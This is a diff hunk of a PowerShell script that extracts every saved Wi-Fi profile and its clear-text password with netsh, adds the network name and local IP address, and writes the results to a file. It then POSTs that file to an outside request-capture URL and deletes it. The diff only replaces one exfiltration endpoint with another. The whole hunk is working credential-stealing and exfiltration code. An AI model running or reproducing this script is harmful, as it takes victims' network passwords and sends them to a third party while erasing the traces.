@@ -2,7 +2,7 @@ cd $env:temp
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > Wi-Fi-PASS
 (get-netconnectionProfile).Name >> Wi-Fi-PASS
 Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress >> Wi-Fi-PASS
-Invoke-WebRequest -Uri https://networkshare.free.beeceptor.com -Method POST -InFile Wi-Fi-PASS
+Invoke-WebRequest -Uri https://requestinspector.com/inspect/01g4qgjsjgtpeqt9h57nhzrnft -Method POST -InFile Wi-Fi-PASS
 Remove-Item *Wi-*
 
 $Acl = Get-Acl "D:\"
